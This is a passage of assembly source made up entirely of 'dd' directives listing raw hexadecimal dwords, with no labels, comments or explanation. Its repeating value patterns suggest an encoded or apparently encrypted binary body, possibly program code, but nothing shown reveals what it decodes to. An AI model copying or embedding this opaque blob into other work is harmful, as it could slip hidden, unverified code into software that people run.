		dd 0E5249B76h, 3E8FFBFh, 6AFFFC61h, 0FD8087FDh,	85AB00EFh
		dd 68ED9700h, 0BD00EFFDh, 3FE8FFB8h, 83FFFC61h,	885F1005h
		dd 0C77EC7F2h, 0EFFD01h, 3A00EFFDh, 0EFFC2C6Ch,	0EFFD00h
		dd 7C5BB1FDh, 0EFFC502Bh, 0FFBF3E00h, 0FC610FE8h, 0CBA98DFFh
		dd 52E69708h, 0CE82476h, 0B1FD00BDh, 502B7C5Bh,	3E00EFFCh
		dd 7F6D907Fh, 907F6D90h, 0AE10037Eh, 0F7D95C64h, 364AB55h
		dd 0F96B64AAh, 16760085h, 0EF7D68h, 970385FDh, 62FF6AEFh
		dd 87DD4Fh, 0AC40EFFDh,	0AFD94466h, 613FE8FFh, 0A98DFFFCh
		dd 0EF9724CBh, 55BD0D8Bh, 351510ABh, 64ED018Eh,	8DC7D94Ch
		dd 9710CBB9h, 173C83EFh, 82C7E50h, 256BCACh, 0EE9CE8FAh
		dd 1510AB10h, 0ED018E1Dh, 0FFD94464h, 24CBA98Bh, 0E924A370h
		dd 2AFE0985h, 0C6207651h, 8D1CCBB9h, 0F2D95466h, 21CBB989h
		dd 0FD52B815h, 0B2A35FEFh, 102B7E5Bh, 6D00E73Fh, 7F6D907Fh
		dd 907F6D90h, 6D907F6Dh, 0EBD94464h, 5166ED8Bh,	33207E1h
		dd 0EB3FFF10h, 907F6D00h, 6D907F6Dh, 7F6D907Fh,	907F6D90h
		dd 0F924AB76h, 0BF0C8BB9h, 0FF00EEE8h, 766F8502h, 16D7E821h
		dd 0C2B102FFh, 6D90EFF9h, 7F6D907Fh, 249B7656h,	48BB8F5h
		dd 57E8FFB9h, 8DFFFC61h, 0AD01DFB9h, 2BE8FFB9h,	6AFFFC60h
		dd 15CF648Ch, 1002F813h, 42DA35Fh, 6D907FFDh, 7F6D907Fh
		dd 55367653h, 0F96B64AAh, 0D4FD7D64h, 56DB89FDh, 0C28B1876h
		dd 0A9760185h, 89E17604h, 761664F5h, 0A17004A9h, 4AD7408h
		dd 9F7CFA02h, 7AB10EEh,	0EF09B2h, 7E08A476h, 0D4B4042Bh
		dd 8A474FDh, 765E2188h,	7AC04A4h, 0EF099Ah, 0CE042B7Eh
		dd 0EBBE892Fh, 5FE7BE89h, 6DC3B4A0h, 7F6D907Fh,	7907E56Ah
		dd 7600EF09h, 6CF524A3h, 0C96AF9C4h, 358BED88h,	0A3760866h
		dd 0C96AF524h, 0B589E989h, 0EFF5C2EBh, 0C2EBBD89h, 6D90EFF5h
		dd 7F6D907Fh, 264EC8Bh,	0B98BEE74h, 0FF7404CBh,	90EFF5C2h
		dd 0F924AB76h, 1BC1E8BFh, 0C2B6FD00h, 6D90EFF5h, 0DE95FF85h
		dd 64FFFC53h, 0FD00EF5Ch, 669950EFh, 0EFFD25h, 0A853BEFDh
		dd 0F3D96C64h, 6C66AA56h, 233FFD9h, 9374EFD4h, 84E0E124h
		dd 0FD00EED1h, 0C7D97464h, 7D66FB8Ah, 0FD4567F9h, 66F57D66h
		dd 0D64F17Dh, 0ED018DA5h, 0A1760164h, 3B367608h, 76029C3Eh
		dd 9A133B37h, 8B30C670h, 206990Dh, 0EE9F5CFAh, 0FF227610h
		dd 0FC628FE8h, 0E7B88BFFh, 0C6D43E2Bh, 0D8BED8Eh, 0DD8BF7D4h
		dd 2BEBA88Bh, 0ADDAEC3Bh, 0BFCE0462h, 0D4FA0253h, 7610EE9Fh
		dd 2B7E08B2h, 8B31D60Ch, 253B830h, 0EE9F6CFAh, 742F7910h
		dd 308BBCF4h, 8D991510h, 0CD64ED01h, 9F60FA02h,	0B1A210EEh
		dd 4C64A65Dh, 7464EBD9h
		dd 0EFFD00E2h, 102B7E00h, 8BDFD43Eh, 9A243BB9h,	4A97652h
		dd 0F87528C6h, 0EE9F784Eh, 0FF977D10h, 97409C03h, 10308BEEh
		dd 18D8115h, 0F94664EDh, 0EA88C7D4h, 18D85A1h, 0F94566EDh
		dd 66F54E64h, 5664F54Dh, 0F15566F1h, 0B0024865h, 5DB13CFEh
		dd 0A6FFA775h, 0EBD94C64h, 0E27464h, 7E00EFFDh,	853E102Bh
		dd 0CD64AE01h, 9F6CFA02h, 2F7910EEh, 7664D774h,	88F7D4F9h
		dd 97C88BE9h, 8BFFFC62h, 368BEB80h, 63CC164h, 8B4A0E02h
		dd 0FEE16C35h, 0A276A41Ch, 8B27404h, 0FD19EB3Bh, 0FBD94C64h
		dd 5BB2A35Fh, 0FD0D6699h, 6CFD00EFh, 902CEDC4h,	6D907F3Eh
		dd 7F6D907Fh, 907F6D90h, 6D907F6Dh, 640C8BB9h, 0C06AF946h
		dd 0B58DF289h, 10BD8A10h, 0A9B3D84h, 0FB7410C1h, 0EE75C811h
		dd 0E8BEF4EBh, 0FD001D6Fh, 65F9C46Ch, 0C7E7D944h, 0FD00EBBBh
		dd 0EE5500EFh, 0E7BBC7h, 3A00EFFDh, 0EFFD0CA9h,	99BFD00h
		dd 0F6C07ABh, 2B7E00EFh, 5E297604h, 6D00EB3Fh, 7F6D907Fh
		dd 907F6D90h, 6D907F6Dh, 0EEF5EC6Eh, 55BCFD00h,	0B98DB8ABh
		dd 0EB9514CBh, 50EFFD01h, 9DC8FA02h, 267E10EEh,	0D3B742FFh
		dd 3D33FFFCh, 0FBD95462h, 0D11853F2h, 765016D6h, 6C0A8B36h
		dd 0FA6402C9h, 368B410Fh, 0ED14C1A0h, 0CB6458F3h, 0E524BB70h
		dd 87FEE16Ch, 0EFFD80h,	5BF4B0Eh, 6CED010Ah, 0AE1D02C9h
		dd 42B3E0Ah, 18760485h,	0FA64248Bh, 0FFF267Eh, 0A0368B41h
		dd 0F3ED14C1h, 70CB6458h, 6CDD24BBh, 0F3BFFEE1h, 26345059h
		dd 267E10EEh, 0F7410FFFh, 97F9C42Ch, 640A8BEDh,	831576D9h
		dd 53F21034h, 2EB2CB64h, 0A51CFFE9h, 0B98D2476h, 0E7E28CBh
		dd 0EF9503h, 59F3AFFDh,	3FE8FFBFh, 8BFFFC61h, 0A8008515h
		dd 0F7D94428h, 0EFFD00h, 9CD4FA02h, 0EFC010EEh,	73ECDD00h
		dd 970285F0h, 0BAFD6AEFh, 6127E8FFh, 618BFFFCh,	0EFFC1CCBh
		dd 1510AE00h, 0ED018E45h, 7ABF064h, 0EF0C58h, 76042B7Eh
		dd 910B8517h, 2B247610h, 0FC146532h, 679FF26Fh,	75A1BD10h
		dd 0D9446209h, 0BFFD6AFFh, 0B8FA0253h, 0AD10EE9Ch, 0FA0255B8h
		dd 10EE9CE8h, 1D1510A8h, 0B0ED018Eh, 81B4A05Eh,	0FD01E739h
		dd 7F6DC3EFh, 907F6D90h, 0F910037Ch, 0B8AB00EFh, 0EEFDB9h
		dd 42C0DCFDh, 0FFFCF8DBh, 151056F3h, 0ED018C85h, 0EFF90087h
		dd 0F8DB9500h, 5E50FFFCh, 0FFFCFCDBh, 639BE8FFh, 2B9FFFCh
		dd 0DCFD00EFh, 249370C0h, 0D94429E4h, 440E00F7h, 0F8DFF08Bh
		dd 0B33FFFCh, 4E57AB89h, 10EE0134h, 790F2EC6h, 0EFFD0070h
		dd 117C968h, 451510EDh,	6AED018Eh, 8061F2C0h, 7000EFFDh
		dd 0BEF524A3h, 6023E8FFh, 0A98BFFFCh, 0AB7614CBh, 4C64EF24h
		dd 1F81FFD9h, 0EFFDFF10h, 100225h, 0A98BBDFDh, 0E7C12CBh
		dd 0EF02FFh, 0D94464ADh, 0A37651FDh, 0E26EE924h, 0FD001002h
		dd 0EF02FFCAh, 0E16EAF00h, 0FD001002h, 0DB9551BFh, 8DFFFCF8h
		dd 9534CBA9h, 0FFFCDBD3h, 4CFA0252h, 7010EE9Eh,	0BFC124ABh
		dd 0FF121AE8h, 0D5C46C02h, 0EFFC0056h, 0BF2FCE00h, 0ED0117C9h
		dd 0EE43AB1Ch, 8BEFFD00h, 0FCFCDBF0h, 0DFF089FFh, 8BFFFCF8h
		dd 7C5EB03Bh, 0EFF9102Bh, 907F3E00h, 6D907F6Dh,	7F6D907Fh
		dd 0D8F7F08Bh, 1181FFFCh, 0EFFD06B7h, 55BC3D33h, 0AAC8D4ABh
		dd 0B1A20D9Ah, 0C46EA65Dh, 0FD00E9A5h, 4CFD042Dh, 10EE2518h
		dd 95246B74h, 56FD00EDh, 0EFFDFFh, 418D2FCEh, 0EFFF6CCBh
		dd 24AB7500h, 44AB1CEDh, 0EFFD007Ah, 11CB818Dh,	5666440Eh
		dd 8C7D1D64h, 9656ED01h, 5700EFFDh, 9370C0DCh, 0AB1CED24h
		dd 0E8FFE597h, 0FFFC6113h, 10CBB98Dh, 451510ADh, 6AED018Eh
		dd 0E8D389C0h, 2FF118Dh, 0F689C06Ah, 1347D68h, 2207EDh
		dd 0A370FF10h, 0E8BEE924h, 2FF12E5h, 4F5C46Ch, 24BB700Dh
		dd 0F4E8BDEDh, 6C02FF12h, 9656F9C4h, 0CE00EFFDh, 0CB818D2Fh
		dd 33440E10h, 2108510h,	6B488B3Ch, 56FFFCD6h, 2F850F2h
		dd 0EE9E7CFAh, 802B0B10h, 0E96A9C89h, 6A9BD310h, 83F089C0h
		dd 0E77E1002h, 91BDFE6Ch, 5D117E15h, 79C7FF80h,	0EFFF685Bh
		dd 0EFFC00h, 0FC0206FDh, 0FB9700EFh, 85892EFFh,	781E9B3Dh
		dd 6CD37D10h, 1591BDFEh, 805D117Eh, 5B79C7FFh, 0EFFF68h
		dd 0FD00EFFFh, 0EFFDDB06h, 7D107800h, 498428EDh, 0EFFD0287h
		dd 0EFFD03h, 0FD002814h, 5B79C7EFh, 0EFFF68h, 0FD00EFF9h
		dd 0EFFDB706h, 0B4537600h, 0FD00ED95h, 6BF2FF6Ah, 0EFFDA8h
		dd 3A08117Eh, 0ED95B46Bh, 0EFFD00h, 0EA75EFFDh,	0FFD94462h
		dd 1348968h, 0E8FFBFEDh, 0FFFC6167h, 10CBB18Dh,	703304ACh
		dd 0BDED24BBh, 6157E8FFh, 0DB3DFFFCh, 91FD00EDh, 24AB7007h
		dd 0E7EBBFEDh, 9AF0FE6Ch, 24A3702Ch, 266887EDh,	10AC10EEh
		dd 18E7515h, 0D95462EDh, 121552FFh, 831002FBh, 6BB9EB39h
		dd 0DCFD00EFh, 249370C0h, 16AB1CEDh, 0CA3A8BD8h, 80EFFD01h
		dd 7E48EA84h, 6CBDFE27h, 0E9AFCF8h, 29F06A76h, 0A37010EEh
		dd 51BFED24h, 3D85FF16h, 7A76129Ah, 10EE2E5Ch, 0ED24AB70h
		dd 0FA0250BDh, 10EE9C88h, 7C042A7Eh, 0EFFC9412h, 0AE63F200h
		dd 14FF1003h, 1002FEBBh, 249B7656h, 0D0B9B8F5h,	50FD00EEh
		dd 10EE1230h, 1DA14A0Eh, 0BFED011Ch, 100CD68h, 12F887EDh
		dd 0EF9710EEh, 636BE8FFh, 0CE5FFFFCh, 0EB3F5E2Fh, 907F6D00h
		dd 6D907F6Dh, 7F6D907Fh, 907F6D90h, 0AB681097h,	8BED01BCh
		dd 0EFFDA1h, 7464BFFDh,	0EFFD00CAh, 0EC037C00h,	7000EFFCh
		dd 7FD24A3h, 0FF1034DCh, 0FCD8BF5Ch, 0CBB18DFFh, 4087AD00h
		dd 3A10EE01h, 0EE01246Bh, 0EFFD00h, 30E8EFFDh, 6B02FF24h
		dd 8DC188C0h, 3A00CBB1h, 0EE09246Bh, 0FF10FD00h, 58E81002h
		dd 6C02FF25h, 8C6402C8h, 0FD0103D9h, 0E27464EFh, 0EFFD00h
		dd 0FCF82B7Ch, 0EB3F00EFh, 24A37000h, 718DBEFDh, 0EFFDC0CBh
		dd 0E4B51500h, 0B18D1002h, 6B3B00CBh, 0EE0924h,	0F4E8EEFDh
		dd 6202FF3Eh, 53D98Ch, 79C6EFFDh, 0EFFCF4CBh, 0D507FD00h
		dd 70FF1019h, 28FD24A3h, 11BD984h, 2FFEFFDh, 0AE15FF10h
		dd 8B1002CAh, 0FCECCB71h, 2FCE00EFh, 0E27464h, 7C00EFFDh
		dd 0EFFCF82Bh, 0EB3F00h, 6D907F6Dh, 7F6D907Fh, 7687026Ah
		dd 9910EEAEh, 0EFFD004Eh, 898BAD00h, 0FD00EFD8h, 31181EFh
		dd 8DEFFD00h, 1530CBB1h, 1002C813h, 137ADA1h, 0D94C62EDh
		dd 0AF9550DFh, 0C7FFFCFCh, 0FDFCCB79h, 0EFFD00EFh, 0ED07FD00h
		dd 79FF1037h, 62D3752Fh, 0C7DFD94Ch, 0FDF4CB79h, 100200EFh
		dd 0C50702FFh, 7EFF1034h, 6376FF27h, 0EF1124h, 0F0898BFDh
		dd 0EFFD00EFh, 173981h,	0F9C2EFFDh, 0CBB18DEFh,	4C62AC30h
		dd 0A0E8EBD9h, 62FD0088h, 0C6DFD94Ch, 0FDF4CB79h, 7FC00EFh
		dd 0FF102D2Ch, 0FD24A370h, 1BD98429h, 0EFFD00h,	0FD695415h
		dd 0CBB18DEFh, 246B3A30h, 0FD00EF09h, 1002FF10h, 0FF269AE8h
		dd 0D98C6402h, 0EFFD0003h, 898B3D33h, 0FD00EFF0h, 173981EFh
		dd 0C2EFFD00h, 6D90EFF9h, 7F6D907Fh, 907F6D90h,	6D907F6Dh
		dd 7995FF85h, 64FFFC53h, 0FD00EF5Ch, 669950EFh,	0EFFD25h
		dd 95EC6EFDh, 62FD00EEh, 0E8EFD94Ch, 2FF27E1h, 0EE25504Eh
		dd 24A37010h, 0BD68BFFDh, 28ED0113h, 197D984h, 0FD00EFFDh
		dd 0E21500EFh, 841002CAh, 702E9A3Dh, 28FD24A3h,	19FD984h
		dd 2FFEFFDh, 0A15FF10h,	831002C8h, 718B1035h, 0EFFC68CBh
		dd 0D669900h, 0FD00EFFDh, 0EE89C46Eh, 42DFD00h,	0D94C62FDh
		dd 637051EFh, 0EF3D24h
		dd 0B25A07FDh, 0A37000EFh, 8429FD24h, 0FD019FD9h, 0A61501EFh
		dd 8D1002CFh, 0FDBCCB71h, 6B3B00EFh, 0EE8D24h, 0A8E8EFFDh
		dd 62FD00BEh, 0C7EFD94Ch, 0FC70CB79h, 100200EFh, 810702FFh
		dd 76FF1035h, 0EE952463h, 0C0DCFD00h, 0FD0D6699h, 6EFD00EFh
		dd 0EE89C4h, 0FD042DFDh, 7F6D907Fh, 907F6D90h, 4B681097h
		dd 8BED01BCh, 0EFFDA1h,	7464BFFDh, 0EFFD00CAh, 0EC037C00h
		dd 7000EFFDh, 7CD24A3h,	0FF103A3Ch, 0FCD8BF5Ch,	0CBB18DFFh
		dd 4087AD30h, 3A10EE01h, 0EF01246Bh, 0EFFD00h, 0D0E8EFFDh
		dd 6B02FF26h, 8DC188C0h, 3A30CBB1h, 0EF09246Bh,	0FF10FD00h
		dd 0F8E81002h, 6C02FF27h, 8C6402C8h, 0FD0003D9h, 0E27464EFh
		dd 0EFFD00h, 0FDF82B7Ch, 0EB3F00EFh, 24A37000h,	0B18DBECDh
		dd 621504CBh, 8DEFFD7Ch, 3B30CBB1h, 0EF09246Bh,	0E8EEFD00h
		dd 2FF2191h, 0EFD94C62h, 0F4CB79C6h, 0FD00EFFDh, 0EF800B07h
		dd 24A37000h, 0D98428CDh, 0EFFD001Bh, 0FF1002FFh, 2C74815h
		dd 0CB718B10h, 0EFFDECh, 74642FCEh, 0EFFD00E2h,	0F82B7C00h
		dd 3F00EFFDh, 7F6D00EBh, 907F6D90h, 6D907F6Dh, 7F6D907Fh
		dd 0D687026Ah, 9910EEAEh, 0EFFD004Eh, 898BAD00h, 0FD00EFD8h
		dd 3B1181EFh, 8DEFFD00h, 1518CBB1h, 1002C6B3h, 137ADA1h
		dd 0D94C62EDh, 0AF9550F7h, 0C7FFFCFCh, 0FDE4CB79h, 0EFFD00EFh
		dd 4D07FD00h, 79FF1035h, 62D3752Fh, 0C7F7D94Ch,	0FDDCCB79h
		dd 100200EFh, 250702FFh, 7EFF103Ah, 6376FF27h, 0EF2924h
		dd 0F0898BFDh, 0EFFD00EFh, 0F3981h, 0F9C2EFFDh,	0CBB18DEFh
		dd 4C62AC18h, 60E8EBD9h, 6202FF50h, 0C6F7D94Ch,	0FDDCCB79h
		dd 7FC00EFh, 0FF10308Ch, 0FD24A370h, 33D98429h,	0EFFD00h
		dd 2C0C415h, 0CBB18D10h, 246B3A18h, 0FD00EF21h,	1002FF10h
		dd 0FF293AE8h, 0D98C6402h, 0EFFD003Bh, 898B3D33h, 0FD00EFF0h
		dd 0F3981EFh, 0C2EFFD00h, 6D90EFF9h, 7F6D907Fh,	907F6D90h
		dd 6D907F6Dh, 1995FF85h, 64FFFC53h, 0FD00EF5Ch,	669950EFh
		dd 0EFFD25h, 31EC6EFDh,	62FD00EFh, 0E8FFD94Ch, 2FF2A81h
		dd 0EE25504Eh, 24A37010h, 0BD68BFEDh, 28ED0113h, 33D984h
		dd 0FD00EFFDh, 821500EFh, 841002C7h, 702E9A3Dh,	28ED24A3h
		dd 3BD984h, 2FFEFFDh, 0AA15FF10h, 831002C6h, 718B1035h
		dd 0EFFDCCCBh, 0D669900h, 0FD00EFFDh, 0EF25C46Eh, 42DFD00h
		dd 0D94C62FDh, 0A37051FFh, 0FD07F924h, 7000EFBCh, 29ED24A3h
		dd 3BD984h, 1501EFFDh, 1002CC43h, 0CBB18Dh, 29246B3Bh
		dd 0EFFD00EFh, 0ADA6E8h, 0D94C62FDh, 0CB79C7FFh, 0EFFDD4h
		dd 2FF1002h, 1038E707h,	246376FFh, 0FD00EF31h, 6699C0DCh
		dd 0EFFD0Dh, 25C46EFDh,	2DFD00EFh, 907FFD04h, 6D907F6Dh
		dd 7F6D907Fh, 907F6D90h, 0EB681097h, 8BED01BBh,	0EFFDA1h
		dd 7464BFFDh, 0EFFD00CAh, 0CC037C00h, 7000EFFDh, 7ED24A3h
		dd 0FF10399Ch, 0FCD8BF5Ch, 0CBB18DFFh, 4087AD10h, 3A10EE01h
		dd 0EF21246Bh, 0EFFD00h, 70E8EFFDh, 6B02FF29h, 8DC188C0h
		dd 3A10CBB1h, 0EF29246Bh, 0FF10FD00h, 98E81002h, 6C02FF2Ah
		dd 8C6402C8h, 0FD0023D9h, 0E27464EFh, 0EFFD00h,	0FDD82B7Ch
		dd 0EB3F00EFh, 24A37000h, 0B18DBEEDh, 521504CBh, 8DEFFD67h
		dd 3B10CBB1h, 0EF29246Bh, 0E8EEFD00h, 2FF2431h,	0EFD94C62h
		dd 0D4CB79C6h, 0FD00EFFDh, 0EF950B07h, 24A37000h, 0D98428EDh
		dd 0EFFD003Bh, 0FF1002FFh, 2C5E815h, 0CB718B10h, 0EFFDCCh
		dd 74642FCEh, 0EFFD00E2h, 0D82B7C00h, 3F00EFFDh, 7F6D00EBh
		dd 907F6D90h, 6D907F6Dh, 7F6D907Fh, 83BB1183h, 3D331034h
		dd 9B7656BCh, 8BB89D24h, 0AAE1D03h, 0E688493Eh,	83B4A35Fh
		dd 0F9C2BB39h, 0EE848DEFh, 0FCFA0257h, 7610EE9Fh, 64258B20h
		dd 0C11476C1h, 58F3ED14h, 0C097C864h, 53EC1C83h, 0E8FF4B0Eh
		dd 0FFFC622Fh, 0C46C0D8Bh, 0F675A9F1h, 2FCE5EB0h, 542B7E5Bh
		dd 0AB00EB3Fh, 9C83E8BCh, 0C46CFD00h, 88C06BF5h, 0DCA35FE4h
		dd 0C46CA6C0h, 0FD042DA9h, 0EFFD1056h, 8D2FCE00h, 7020CB81h
		dd 1CE124BBh, 24A370ABh, 0D94428F1h, 0EFFD44F3h, 50BDAC00h
		dd 0AD50BFADh, 28AD56BFh, 0CA3D944h, 210EE2Eh, 0EE9D9CFAh
		dd 85AE10h, 9DD4FA02h, 10AD10EEh, 18F2D15h, 455EB0EDh
		dd 0EFFD00EEh, 542B7E5Bh, 6D00EB3Fh, 7F6D907Fh,	907F6D90h
		dd 0AB54037Eh, 0CB818BB8h, 57C09760h, 9FC0FA02h, 1F7610EEh
		dd 46E73983h, 0CF5FE788h, 2B7E5E2Fh, 57B93E54h,	0FD720815h
		dd 0E73983EFh, 69A3D84h, 3983B1A2h, 0FF44C3BBh,	33EFFD00h
		dd 0D97C623Dh, 6256F3F3h, 8DE7D944h, 0AD18CBB1h, 85FD6ABEh
		dd 6AEF9700h, 970085FDh, 347568EFh, 0C7B9ED01h,	0B940CBB9h
		dd 28FD00EFh, 0CA7D944h, 210EE2Eh, 0EE9D9CFAh, 1B370A10h
		dd 25F7B03Dh, 0BB3983B1h, 907F6DC3h, 6D907F6Dh,	7F6D907Fh
		dd 907F6D90h, 0FC3C037Ch, 267E00EFh, 562FCEFFh,	0B9245B76h
		dd 0B8FD00EEh, 0AE1D038Bh, 88493E0Ah, 6EA35FE4h, 0EEC1C4h
		dd 0FD042DFDh, 0EE848DBCh, 1510AA55h, 0ED018D01h, 776CF64h
		dd 0FD643C8Bh, 0E02063Ch, 6C358B4Ah, 0E16CF9C4h, 70A41CFEh
		dd 87B124A3h, 0EFFC00h,	351510ACh, 50ED018Fh, 10EE2694h
		dd 0CEFF267Eh, 1D26332Fh, 2B3E0AAEh, 0D9546204h, 640A8BA3h
		dd 833E76FAh, 0A1881034h, 0AB3A4ECBh, 0D3ED24h,	53F2EFFDh
		dd 2EB2CA64h, 0A51CFFE9h, 0B98D2576h, 0E7E4CCBh, 24AB3A03h
		dd 0FD00AFE9h, 6259F3EFh, 89FFD94Ch, 0AC18CBA1h, 0CFD95C66h
		dd 24CBB989h, 0D5248374h, 0C3D95C66h, 30CBA189h, 0C924B374h
		dd 8CC11510h, 9887ED01h, 200EFC7h, 0EE9CFCFAh, 24AB7610h
		dd 89C3D4B5h, 10AD53E3h, 18F2515h, 0D95C66EDh, 10AE55A7h
		dd 18F2915h, 0E8FFBFEDh, 0FFFC603Fh, 0B8B0A65Dh, 0FD00EFFCh
		dd 0D33981B1h, 0C2EFFD01h, 6D90EFF9h, 7F6D907Fh, 18F1181h
		dd 3483EFFDh, 0B93D3310h, 68CB498Bh, 0AA00EFFCh, 410FFE64h
		dd 0FA62CF7h, 0FD002C79h, 0EFBCB9EFh, 7C62FD00h, 56F38BD9h
		dd 0E7D94462h, 0CCBB9C7h, 0FD00EEF9h, 0EFC268BFh, 85FD0Fh
		dd 0FCDB2B95h, 0EFFD68FFh, 15107D00h, 0ED018FD1h, 6AF2C06Ah
		dd 0EFFD8Ch, 0F124A370h, 8BD95462h, 8BBFAF51h, 0AD14CBB9h
		dd 8FB51510h, 4C64ED01h, 251E7D9h, 0EE9D20FAh, 24BB7010h
		dd 0E8FFBD99h, 0FFFC6157h, 5C9B3D85h, 9924AB70h, 0EE2E2087h
		dd 1510AD10h, 0ED018D05h, 6AF5C46Ch, 56AA89C0h,	0B91510ADh
		dd 56ED018Eh, 0EFFD10h,	818D2FCEh, 0BB7024CBh, 0AB1CDD24h
		dd 0ED24A370h, 0CFD94428h, 0EFFD44h, 0AD50BDACh, 0BFAD50BFh
		dd 84CB798Dh, 3A00EFFDh, 0E3B524ABh, 50FFFCD3h,	0E8FFEF97h
		dd 0FFFC6073h, 5E2FCF5Fh, 0FC602B7Ch, 7F3E00EFh, 53FF1183h
		dd 9D54F276h, 64A810EEh, 18FAD2Dh, 3A57B9EDh, 0E7E924ABh
		dd 0C7FFFCDCh, 118CBB9h, 28ED0134h, 0F4F3D944h,	7010EE26h
		dd 28E92493h, 3FFD944h,	7600EFFDh, 0EF9750E8h, 0F0642EFFh
		dd 0F1741978h, 10AB0085h, 1510ABD5h, 0ED018FB1h, 0FFD94464h
		dd 48EB3A83h, 0ED24AB74h, 0B1A2D99Ah, 0C46CA65Dh, 6D902CEDh
		dd 7F6D907Fh, 907F6D90h, 0F900037Ch, 0EF4400EFh, 33EFFD01h
		dd 7057B93Dh, 1CF52493h, 246B76ABh, 0FD00EBF1h,	0E7D94C62h
		dd 0D0279550h, 251FFFCh, 0EE9E4CFAh, 245B7610h,	0FD00EBE1h
		dd 85F1C46Ch, 1510AB00h, 0ED018E45h, 0EE9756BFh, 18CBA98Dh
		dd 0FCD02F95h, 0ED9552FFh
		dd 0E86FFD00h, 0FD00AA35h, 0B0E1C46Ch, 2B7C5Eh,	3E00EFF9h
		dd 7F6D907Fh, 907F6D90h, 6D907F6Dh, 0EBFDEC6Eh,	56FD00h
		dd 0CE00EFFCh, 62AA562Fh, 68E7D97Ch, 0ED013F05h, 0AB70AB1Ch
		dd 0FFBFF124h, 0FC63A3E8h, 0CB498BFFh, 0EFF918h, 97082B7Eh
		dd 0FA0256EFh, 10EE9CB8h, 0FC6AB9ADh, 0F7D94C62h, 13F0D68h
		dd 0FF68BEEDh, 77D00EFh, 0EFB860h, 0A21C2B7Eh, 0EF3981B1h
		dd 0C3EFFD04h, 6D907F6Dh, 0EFFD0B07h, 0F91400h,	6D90EFFDh
		dd 7F6D907Fh, 11C19B9h,	196606EDh, 7F6D00EFh, 907F6D90h
		dd 0FD6C5F95h, 0D8CE8FFh, 0C3B6FD00h, 6D907F6Dh, 0EE0EE456h
		dd 0E4A31410h, 6D90EFFDh, 7F6D907Fh, 0EFF6E8h, 0FD1606FDh
		dd 7F6D00EFh, 907F6D90h, 0FCF8C744h, 0BDBE9FFh,	907FFD00h
		dd 6D907F6Dh, 0EF91F087h, 0E2DE1510h, 3E59EFFDh, 7F6D907Fh
		dd 117D5B9h, 190C06EDh,	7F6D00EFh, 907F6D90h, 0D97464ABh
		dd 6C3D33E3h, 2091FCFEh, 2C573976h, 18378B05h, 4EDB70D9h
		dd 0F124A376h, 649BFFDCh, 22E7E39h, 884A28FEh, 0EB165F1Ch
		dd 8CBB18Bh, 895E1978h,	652F33E9h, 8B2DFE11h, 2FFCA35h
		dd 63C00EFh, 8B27FE10h,	0EDE82E3Ch, 3F0AC1ECh, 907F6DC3h
		dd 6D907F6Dh, 7F6D907Fh, 907F6D90h, 8A681097h, 8BED01BBh
		dd 0EFFDA1h, 7464BFFDh,	0EFFD00CAh, 24037E00h, 0B9C7B8ABh
		dd 0EFFD1CCBh, 150FD00h, 7000EFFDh, 66F124A3h, 0E8DBD97Ch
		dd 0FD000C91h, 0E7D94C62h, 34CBB9C6h, 1E5E07FFh, 0A37000EFh
		dd 4429E524h, 1503DBD9h, 0EFFDE3BFh, 10CBB18Dh,	0C924AB3Bh
		dd 0CBFE8EBh, 4C62FD00h, 0B9C6FBD9h, 7F834CBh, 0EF1E34h
		dd 0C924AB3Bh, 1C15A0E9h, 0C06BED01h, 898BF688h, 0AB703CCBh
		dd 8BBFBD24h, 1E4C0733h, 937400EFh, 8B06E124h, 9700EFFFh
		dd 63E8FFEFh, 50FFFC62h, 9FB8FA02h, 2B7E10EEh, 24A37008h
		dd 0B18DBEBDh, 0F21510CBh, 6AEFFDE3h, 245C87FDh, 0A37010EEh
		dd 707E924h, 7600EF1Eh,	10028317h, 2D7790Fh, 0C88BEFFDh
		dd 0FFFC6207h, 2D64A853h, 0ED018D41h, 0EE1FA487h, 24A37010h
		dd 1FDA07E9h, 4B9500EFh, 8DFFFCE2h, 151CCBB1h, 0EFFDE223h
		dd 5462FE6Ah, 0AF57C3D9h, 0CFD94C62h, 0D48E8h, 0B18DBFFDh
		dd 0AB3B24CBh, 0E8E8BD24h, 0FD000D45h, 0C7D94C62h, 3CCBB9C6h
		dd 1F8007FBh, 0A87000EFh, 8DEE9701h, 0AD30CBB1h, 0CBB18DBEh
		dd 0E26B1520h, 7050EFFDh, 29DD24A3h, 8AFD944h, 0FDE26815h
		dd 0CBB18DEFh, 24AB3B2Ch, 0B2E8E9C1h, 64FD000Dh, 83F3D954h
		dd 0FC6AED3Ah, 0DBD94462h, 50B8E78Ah, 0DD24A370h, 0EF1F4D07h
		dd 50EF7600h, 39833A02h, 0CBB18DEBh, 0E8177630h, 0FD000DDFh
		dd 6C3EBEE0h, 0F86C40C0h, 0DA87E0EFh, 0DCFD00EEh, 0FC6777C9h
		dd 210EF8Dh, 9F158DCBh,	0FF6AED00h, 0FC2C61F2h,	390200EFh
		dd 0E54499h, 4F7EFFDh, 0BDCDC26Ch, 14CBA98Dh, 0FCDCD795h
		dd 1E1552FFh, 83EFFDE1h, 0B98DE339h, 0A37010CBh, 0E8BFE524h
		dd 0FD000E27h, 63275A0h, 0EFFDF6h, 730F1078h, 0EFFD0001h
		dd 0B9762BFFh, 0FD00EFE7h, 2D7EF918h, 5462AF41h, 0C568FBD9h
		dd 0BDED0133h, 0E4EE8h,	0F1C46CFDh, 0FFD94462h,	18CBB18Dh
		dd 1C9C07ADh, 9AB200EFh, 5714CFh, 285EFFDh, 0EF4D8EE0h
		dd 0D610FD00h, 0FD1A5664h, 160A00EFh, 528E3F83h, 0E924BB70h
		dd 0EE213887h, 7507AF10h, 7E00EF1Ch, 0AB700C2Bh, 4C62ED24h
		dd 1550F7D9h, 0EFFDE1B1h, 0EB20884Fh, 83FF6A80h, 762BFF96h
		dd 0EFF7B9h, 7EF918FDh,	10AF302Dh, 65664D6h, 0A00EFFDh
		dd 0AE3F8316h, 99390252h, 0FD00E544h, 6C04F7EFh, 0FFBDCDC2h
		dd 0FBB9762Bh, 18FD00EFh, 412D7EF9h, 0D95462AFh, 33D568CFh
		dd 0E8BDED01h, 0FD000EE9h, 62E5C46Ch, 8DFFD944h, 0AD18CBB1h
		dd 0EF1DFD07h, 0A59AB200h, 5968F316h, 62ED010Dh, 0E8FBD94Ch
		dd 0FD000F01h, 0EE1FA487h, 24A37010h, 1DEE07E1h, 0A37600EFh
		dd 5464E524h, 0AF51CFD9h, 0F3D94C62h, 0F3EE8h, 950085FDh
		dd 0FFFCD9B3h, 1CCBB18Dh, 0FDE03E15h, 6C058BEFh, 85E002FFh
